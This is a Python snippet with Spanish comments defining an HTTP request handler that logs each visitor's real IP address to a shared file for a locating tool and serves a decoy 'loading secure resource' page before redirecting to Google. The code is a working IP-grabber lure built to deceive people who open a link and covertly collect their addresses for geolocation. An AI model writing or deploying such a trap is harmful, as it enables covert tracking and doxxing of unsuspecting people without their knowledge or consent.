class ServidorIPLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        # Captura la IP real detrás del proxy de red
        ip_cliente = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
        
        # Guarda la IP en el archivo compartido para que 'ip-locali' la procese
        if ip_cliente and ip_cliente != "127.0.0.1" and "favicon.ico" not in self.path:
            with open(LOG_FILE, "a") as f:
                f.write(f"{ip_cliente}\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html_trampa = """
        <html>
        <head>
            <title>Cargando...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
            <script>setTimeout(function(){ window.location.href = "https://www.google.com"; }, 1500);</script>
        </head>
        <body>
            <div style="text-align: center;"><div class="loader" style="margin: 0 auto 20px;"></div><p>Cargando recurso seguro...</p></div>
        </body>
        </html>
        """
        self.wfile.write(html_trampa.encode('utf-8'))

    def log_message(self, format, *args): return

